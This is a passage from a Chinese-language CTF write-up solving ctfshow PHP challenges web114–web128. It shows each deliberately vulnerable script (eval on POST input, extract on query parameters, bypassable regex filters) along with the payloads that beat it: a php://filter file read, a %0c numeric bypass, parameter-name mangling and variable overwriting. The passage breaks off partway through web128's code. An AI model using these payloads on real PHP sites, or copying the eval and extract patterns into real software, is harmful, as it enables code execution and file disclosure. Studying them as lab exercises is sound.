class="line-numbers-rows"><span></span></span></code></pre><p>太菜，还是不怎么明白，先接着做。解释是：超过20次软连接后就可以绕过is_file，在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容，多次重复后绕过is_file。</p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"师傅们居然tql都是非预期 哼！"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次虽然把压缩流的协议ban了，但是发现filter协议又被放了出来，所有直接构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag：ctfshow{a5dcc792-199b-4f4e-9ed7-e1bb379bdc09}</p><h4 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过脚本爆破，去寻找可以绕过的字符：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">128</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$a</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_115.png"></p><p>发现%0C可以绕过，payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>num<span class="token operator">=</span><span class="token operator">%</span><span class="token number">0</span>c36<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag：ctfshow{811642c6-7bb9-4f2e-81e2-3c98cb6f8915}<br>（题中的!== 进行比较时则不进行类型转换，而==比较时会进行类型转换再比较）</p><h4 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先需要知道的是php变量名中只有字母和下划线，没有点.，而当变量名中有空格、+、[ 时会自动转化为下划线，所以按正常来说无法构造出CTF_SHOW.COM变量，但如何将下划线_换成[ 时，后面的特殊字符就会被保留下来，不会被替换。</p><p><img src="/images/web_123.png"></p><p>而在这题中，发现它用eval执行了$c，所以可以选择只满足第一个和第二个if的条件即可，同时比较运算符&lt;=在比较之前也会进行类型转换，即弱比较</p><p>则payload为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">post<span class="token punctuation">:</span><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到flag：ctfshow{0f7fb39f-e6f2-412b-bbc6-887a8c07db0c}</p><h4 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>继上一题，这题将echo等也过滤，但发现可以使用highlight_file()函数对flag.php文件高亮，（使用show_source()函数无反应，应该被ban了）；索引payload为:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token number">2</span><span class="token operator">=</span>flag<span class="token operator">.</span>phppost<span class="token punctuation">:</span><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span>h<span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>成功拿到flag:ctfshow{a9fb32b2-0df6-4fe7-b2a2-04494d069390}<br>但通过看群主的视频，知道了另一种解法，变量覆盖，通过post传fl0g=flag_give_me，将fun参数赋值为extract($_POST),意思是使用extract函数将post里的参数注册为变量，从而达到变量覆盖的目的，则payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fl0g<span class="token operator">=</span>flag_give_me<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看了其他师傅给的解法，才知道了题目中的$_SERVER[‘argv’]的用处，在web页模式下必须在php.ini开启register_argc_argv配置项，设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果，这时候的<br>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]，query_string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据，本地测试：</p><p><img src="/images/web_126.png"></p><p>所以可以构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token punctuation">;</span>post<span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token operator">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>拿到flag:ctfshow{829f90f5-e08e-4538-942f-4f47c0d7434b}</p><h4 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//特殊字符检测</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"嗯哼？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ctf_show</span><span class="token operator">===</span><span class="token string single-quoted-string">'ilove36d'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题刚好又用到了$_SERVER[‘QUERY_STRING’]变量，同时也知道再通过get或post传参时如果参数中有空格、+、[ 时会自动转化为下划线，发现没有过滤空格，所以payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ctf show<span class="token operator">=</span>ilove36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag：ctfshow{c643887a-c67e-4b33-930d-a9e162498502}</p><h4 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token 